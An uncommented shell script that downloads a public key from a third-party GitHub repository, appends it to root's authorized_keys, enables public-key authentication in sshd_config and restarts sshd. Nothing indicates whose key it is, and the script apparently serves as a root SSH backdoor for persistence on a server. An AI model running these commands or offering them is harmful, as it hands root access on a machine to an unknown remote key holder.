apt-get update
apt-get -y install wget
cd /root
mkdir .ssh
cd  .ssh
wget https://github.com/fffgg3g/incodeserver/raw/master/gongmi.gongmi -O ras.pub
cat ras.pub >> authorized_keys
chmod 600 authorized_keys
chmod 700 /root/.ssh
sed -i '$a\AuthorizedKeysFile     /root/.ssh/authorized_keys'  /etc/ssh/sshd_config
sed -i '$a\RSAAuthentication yes'  /etc/ssh/sshd_config
sed -i '$a\PubkeyAuthentication yes'  /etc/ssh/sshd_config
service sshd restart
